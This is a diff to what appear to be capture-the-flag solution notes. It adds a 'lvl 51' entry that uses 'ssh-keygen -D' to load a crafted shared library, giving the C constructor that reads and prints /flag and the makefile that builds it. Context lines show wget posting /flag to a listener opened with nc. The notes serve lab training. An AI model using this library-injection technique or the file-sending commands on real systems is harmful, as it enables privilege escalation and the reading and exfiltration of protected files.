@@ -249,3 +249,40 @@ as @/flag
 wget localhost:5000 --post-file=/flag # to send file via POST
 nc -l localhost 5000 # listening server
 ~~~
+
+## lvl 51
+    ssh-keygen -D ./lib.so
+    # library injection
+~~~c
+#include <stdio.h>
+
+void __attribute__ ((constructor)) constructor(){
+        FILE *f;
+        f = fopen("/flag","r");
+        char c;
+        c = fgetc(f);
+        while(c != EOF){
+                printf("%c",c);
+                c = fgetc(f);
+        }
+
+        fclose(f);
+}
+void C_GetFunctionList(){}
+~~~
+
+~~~makefile
+CC=gcc
+CFLAGS=-Wall -Werror -fpic -I.
+FNAME = lib.so
+
+%.o: %.c
+	$(CC) -c -o $@ $< $(CFLAGS)
+
+all: $(FNAME).o
+	$(CC) -shared -o $(FNAME).so $(FNAME).o
+
+clean:
+	rm -f $(FNAME).o $(FNAME).so
+~~~
+[Lib2Shell](https://github.com/SeanPesce/lib2shell/tree/master)
